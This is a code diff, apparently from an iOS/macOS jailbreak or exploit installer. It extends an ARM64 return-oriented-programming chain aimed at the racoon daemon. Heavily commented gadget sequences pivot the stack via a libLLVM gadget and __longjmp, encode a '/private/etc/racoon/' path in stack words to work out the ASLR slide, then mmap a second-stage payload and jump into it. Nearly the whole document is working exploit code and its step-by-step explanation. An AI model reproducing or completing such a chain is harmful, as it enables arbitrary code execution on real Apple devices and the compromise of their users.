@@ -276,6 +276,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 
 	We start with nothing but rip control and x21 pointing to a string buffer (AAAAAAAA<address of our rop stack>)
 	the pivot x21 gadget looks like this:
+	(this comes from libLLVM)
 	0x1990198fc      a80640f9       ldr x8, [x21, 8]    <= x8 = address of our rop stack
 	0x199019900      090140f9       ldr x9, [x8]        <= x9 is the first value at our rop stack
 	0x199019904      292940f9       ldr x9, [x9, 0x50]  <= x9 is loaded from x9->0x50 and this is used to jump (we need to put our next code pointer there)
@@ -292,6 +293,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	[2]:
 	Next we jump to longjmp to pivot and get more control over our registers
 	x0 will point to the top of the stack
+	(this comes from libsystem_platform)
 	__longjmp:
 	   180a817dc	LDP     X19, X20, [X0,#0]	 // x19 will contain the same address as x9 and we don't really want to change that 0x08 of our stack will be loaded into x20
 	   180a817e0	LDP     X21, X22, [X0,#16]	 // x21 = our stack 0x10 and x22 = our stack 0x18
@@ -339,7 +341,18 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 		Now this is our dispatcher it will straight jump to x21 (which we control [2]) with the args we setup in [3]
 		and after that it will load x30 from the stack at 0x38 and add 0x40 to the stack, so the stack will move from 0xb0 to 0xf0
 		We will call open("/private/etc/racoon/<func pointer>", O_RDONLY); the func pointer will be used to know which slide we need to use
-		Path is stored at 0x70 FIXME (we need to be right before a func pointer)
+		Path is stored at 0xc0 
+
+		path: (/private/etc/racoon/<func pointer>\x00):
+		0x2f707269 /pri
+		0x76617465 vate
+		0x2f657463 /etc
+		0x2f706163 /rac
+		0x6f6f6e2f oon/
+		0xXXXXXXXX <func pointer>
+		0x00
+		
+		Fingers crossed thatt the string will survive when we start to call funcs...
 
 	[5]:
 		we need to load new regs now, we will use a stack loader for that
@@ -359,13 +372,18 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 		 regloader again
 	[7]:
 		dispatcher to mmap(stage2_base,stage2_size,PROT_READ | PROT_WRITE,STAGE2_FD,0)
+		
+		Stack will move from 0x160 to 0x1a0
+
+	[8]:
+		when we are here x0 contains the return value of mmap/the stage so we just jump to longjmp and let stage2 handle all of the other stuff
 	*/
 	ROP_SETUP(&myoffsets);
 	ADD_OFFSET_GADGET(0);					   // 0x00		[1] x9 will be loaded from here and then again point to our stack so at our stack+0x50 we need the next gadget
 	ADD_GADGET();							   // 0x08		[2] x20
 	ADD_CODE_GADGET(myoffsets.open);		   // 0x10		[2] x21 [4] dispatcher: jump/next gadget
 	ADD_STATIC_GADGET(O_RDONLY);			   // 0x18		[2] x22 [3] regloader: x1/second arg
-	ADD_OFFSET_GADGET(0x70)					   // 0x20		[2] x23 [3] regloader: x0/first arg (path for open)
+	ADD_OFFSET_GADGET(0xc0)					   // 0x20		[2] x23 [3] regloader: x0/first arg (path for open)
 	ADD_GADGET();							   // 0x28		[2] x24 [3] regloader: x2/thrid arg
 	ADD_GADGET();							   // 0x30		[2] x25 [3] regloader: x3/fourth arg
 	ADD_GADGET();							   // 0x38		[2] x26 [3] regloader: x4/fifth arg
@@ -386,14 +404,14 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 
 	ADD_GADGET();							   // 0xb0		[2] new stack top
 	ADD_GADGET();							   // 0xb8
-	ADD_GADGET();							   // 0xc0		[4] x22
-	ADD_GADGET();							   // 0xc8		[4] x21
-	ADD_GADGET();							   // 0xd0		[4] x20
-	ADD_GADGET();							   // 0xd8		[4] x19
-	ADD_GADGET();							   // 0xe0		[4] x29
+	ADD_STATIC_GADGET(0x2f707269);			   // 0xc0		[4] x22 (/pri)
+	ADD_STATIC_GADGET(0x76617465);			   // 0xc8		[4] x21 (vate)
+	ADD_STATIC_GADGET(0x2f657463);			   // 0xd0		[4] x20 (/etc)
+	ADD_STATIC_GADGET(0x2f706163);			   // 0xd8		[4] x19 (/rac)
+	ADD_STATIC_GADGET(0x6f6f6e2f);			   // 0xe0		[4] x29 (oon/)
 	ADD_CODE_GADGET(myoffsets.stackloader);	   // 0xe8		[4] x30/ld load (next gadget)
 
-	ADD_GADGET();							   // 0xf0		[4] stack will be here after dispatch returned
+	ADD_STATIC_GADGET(0x00);				   // 0xf0		[4] stack will be here after dispatch returned (zero char for the string)
 	ADD_GADGET();							   // 0xf8
 	ADD_CODE_GADGET(myoffsets.dispatcher);	   // 0x100		[5] x28 [6] regloader: jump/next gadget
 	ADD_GADGET();							   // 0x108		[5] x27 [6] regloader: x5/fifth arg
@@ -409,6 +427,15 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	ADD_CODE_GADGET(myoffsets.regloader);	   // 0x158		[5] x30 (next gadget)
 
 	ADD_GADGET();							   // 0x160     [5] new stack top
+	ADD_GADGET();							   // 0x168     
+	ADD_GADGET();							   // 0x170     [7] x22
+	ADD_GADGET();							   // 0x178     [7] x21
+	ADD_GADGET();							   // 0x180     [7] x20
+	ADD_GADGET();							   // 0x188     [7] x19
+	ADD_GADGET();							   // 0x190     [7] x29
+	ADD_CODE_GADGET(myoffsets.longjmp)		   // 0x198     [7] x30 (next gadget) [8] kickstart of stage 2, longjmp will load from there, so start of stage2 is the new longjmp buffer
+
+	ADD_GADGET();							   // 0x1a0     [7] new stack top
 
 
 
